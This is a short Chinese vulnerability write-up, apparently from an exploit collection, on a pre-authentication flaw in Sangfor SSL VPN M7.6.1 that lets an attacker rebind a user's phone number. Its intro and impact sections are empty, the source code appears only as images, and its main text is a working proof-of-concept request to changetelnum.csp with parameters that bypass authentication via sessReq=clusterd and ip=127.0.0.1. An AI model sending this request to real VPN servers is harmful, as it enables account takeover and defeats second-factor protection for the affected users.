深信服 SSL VPN - Pre Auth 修改绑定手机
======================================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

老版本(M7.6.1)代码放上，看不懂的直接看 POC
吧；新版本的没绕成功还在审，所以不确定是不是这个

![1.png](./.resource/深信服SSLVPN-PreAuth修改绑定手机/media/rId24.png)

![2.png](./.resource/深信服SSLVPN-PreAuth修改绑定手机/media/rId25.png)

![3.png](./.resource/深信服SSLVPN-PreAuth修改绑定手机/media/rId26.png)

### POC

    https://www.0-sec.org/por/changetelnum.csp?apiversion=1

    newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1

参考链接
--------

> https://blog.sari3l.com/
